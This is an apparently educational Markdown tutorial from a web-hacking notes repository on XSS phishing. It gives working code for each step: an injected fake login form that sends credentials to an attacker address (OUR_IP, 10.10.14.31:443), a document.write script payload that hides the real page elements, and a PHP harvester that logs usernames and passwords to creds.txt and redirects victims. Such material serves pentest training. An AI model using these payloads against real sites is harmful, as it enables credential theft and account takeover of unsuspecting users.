# XSS Phishing attack.
## Attack Overview
Another very common type of XSS attack is a phishing attack. Phishing attacks usually utilize legitimate-looking information to trick the victims into sending their sensitive information to the attacker.</br>
A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.
Once we identify a working XSS payload, we can proceed to the phishing attack. To perform an XSS phishing attack, we must inject an HTML code that displays a login form on the targeted page. 
This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.<br />
__This time our target is:__<br />
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/afc0a1f6-4b50-4f66-bb5a-db7207a3ad04" width="350"><br />
__After injecting our payload:__<br />
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/8e956fb4-ee2a-4678-a574-bfd36b76e41f" width="350">

## Login Form Injection
This is a simple login form that we can inject.
Code: html
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```
After we have found the correct payload we can try to load the login form. We have to minify our html login and add it to our payload.
__Result (minified html code + XSS payload):__
```html
<script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>')</script>
```
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/390f7bb2-f462-4396-a6b9-86b9fcf94292
" width="350">

### Making it more realistic.
As we saw in the last picture We can still see the original web functionality, we must delete it to make our attack more realistic [Removing Elements]. We can delete part of the code that is being
shown after our injection too, to do so we only need to add a javascript comment after the payload`<!--`.
#### Removing Elements
For removing Elements we can use `document.getElementById()` function + `.remove()`.
- Obtaining the id of the element we want to remove:
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/c9e4c784-205a-4c97-8d66-641d5622e3b6" width="700"><br />
- Adding to our payload:
</br>

```html
'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.31:443><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/c2040539-1a58-40c2-97d8-3dafc6a6535f" width="500">

## Executing the attack.
We can create a file to get and write the credentails we obtain in to a file. We will create a redirection to the original web page in the same file.
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+"); #ESCRIBIENDO LAS CREDENCIALES EN UN ARCHIVO CREDS.TXT
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php"); #REDIRECCIÓN A UNA WEB LEGÍTIMA.
    fclose($file);
    exit();
}
?>
```
Once everything is ready we can send the phishing attack to our victim and just wait listening in the selected port of our payload.
![12](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/73ef1459-0d21-4a31-a150-f1e99496f839)

![13](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/ad3763e1-2ee6-447c-a831-680f03f5a8e2)






